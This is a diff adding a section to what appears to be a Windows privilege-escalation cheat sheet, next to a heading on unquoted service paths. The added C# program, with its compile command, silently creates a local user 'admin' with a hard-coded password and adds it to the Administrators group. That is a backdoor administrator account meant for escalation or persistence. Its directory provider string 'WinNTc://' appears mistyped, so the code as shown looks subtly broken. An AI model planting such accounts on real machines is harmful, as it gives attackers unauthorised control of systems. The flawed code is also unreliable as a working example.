@@ -1,3 +1,39 @@
+# Add a user to the local system - C#
+- [Add a user to the local system - C#](https://docs.microsoft.com/en-us/troubleshoot/developer/visualstudio/csharp/language-compilers/add-user-local-system)
+```csharp
+// "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:exe /r:"C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.DirectoryServices.dll" Program.cs
+
+using System;
+using System.DirectoryServices;
+
+class Class1
+{
+    static void Main(string[] args)
+    {
+        try
+        {
+            DirectoryEntry AD = new DirectoryEntry("WinNTc://" +
+            Environment.MachineName + ",computer");
+            DirectoryEntry NewUser = AD.Children.Add("admin", "user");
+            NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
+            NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
+            NewUser.CommitChanges();
+            DirectoryEntry grp;
+
+            grp = AD.Children.Find("Administrators", "group");
+            if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
+            Console.WriteLine("Account Created Successfully");
+            Console.ReadLine();
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+            Console.ReadLine();
+        }
+    }
+}
+```
+
 # Unquoted Service Paths
 
 ## WMIC
